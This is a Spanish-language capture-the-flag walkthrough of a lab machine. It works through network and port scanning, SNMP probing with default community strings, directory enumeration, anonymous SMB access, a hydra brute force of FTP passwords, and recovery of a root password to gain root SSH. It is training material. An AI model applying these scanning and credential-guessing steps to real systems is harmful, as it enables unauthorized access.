Encendemos la máquina en el docker y tenemos que hacer descubrimiento sobre ella. Para ello como sabemos que está en la misma red local hacemos:
```
sudo arp-scan -I <Interfaz_docker> --localhost
```
Con esto descubrimos su `ip` `192.168.10.23`

Como tenemos su `ip` podemos hacer un `nmap` para descubrir que servicios tiene encendidos.
```
sudo nmap -sS -p- -n -Pn --min-rate <N> <TARGET_IP>
```

Ahora haremos un scaneo de los servicios que están corriendo:
```
sudo nmap -sCV -p22,110,139,143,445,993,995,4443,8080,10021 <TARGET_IP>
AS{apachessl_NMAPCHECK}
```
Encontramos una #flag 

También hacemos esto para `UDP`:
```
sudo nmap -sU --top-port 100 192.168.10.23
```
Tiene un servicio abierto de `snmp` por lo que probamos su contraseña por defecto:
```
snmpwalk -v2c -c public 192.168.10.23 | grep AS
```
o
```
snmp-check 192.168.10.23 -c public
```
y así obtenemos su #flag AS_{snmp_nmapsCV}

Vamos a probar a hacer `curl` a los servicios `http` y `https`:
```
$ curl 192.168.10.23:8080
AS_{http8080_COMPROBARHTTPS}
```
Nos responde con una #flag 

Intentamos hacer una conexión no certificada por `https` y con --verbose:
```
$ curl -vk https://192.168.10.23:4443
AS_{https4443_BUSCARDIRECTORIOS}
```
Nos responde con una #flag
Como la flag nos guiaba a buscar directorios hemos decidido hacer un `gobuster`:
```
$ gobuster dir -u http://192.168.10.23:8080/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```
Nos devuelve dos directorios: `hidden` y `funstuff`
`hidden` directamente nos da una #flag  AS_{hiddendirectories_SIGUIENTEPASO} y nos dice que hagamos `ssh larrybird`
Probamos el `ssh` y nos deja entrar:
```
ssh larrybird@192.168.10.23
```
nos da una #flag AS_{ssh_SMB}

Por el otro lado en el directorio `funstuff` encontramos una imagen que pone `metadatos`. Con `wget` la descargamos:
```
exiftool image.jpg
```
Nos devuelve la #flag dentro de sus metadatos. AS_{INSPECCIÓN_METADATOS}

En el servicio `SMB`:
```
$ smbclient -L //192.168.10.23 -N
$ smbclient //192.168.10.23/as_share -N
$ cat ftp_credentials.txt
smb: \> ls
smb: \> get ftp_credentials.txt
AS_{SMB_FTPBRUTEFORCE}
Users: as, michael, jordan
Passwords: no info
```
Obtenemos la #flag 

Para el servicio `ftp` que está en el puerto `10021` podemos intentar hacer un ataque de fuerza bruta:
```
hydra -l as -P /usr/share/wordlists/rockyou.txt ftp://192.168.10.23:10021
```
Esto nos devuelve: `login: as   password: qwertyuiop`
```
$ ftp 192.168.10.23 10021
```
Aquí meteremos usuario y contraseña y podremos acceder a coger el #flag 
```
AS_{ftp10021_BASE64}
```

También nos devuelve a parte de la flag un `string` en base64, que al decodificarlo:
```
$ openssl enc -base64 -d -in flag.txt
root:as_practicas
```
Al entrar por `ssh` a `root`:
``` 
ssh root@192.168.10.23
```
y hemos encontrado la #flag 
```
AS_{FINPRACTICA}
```



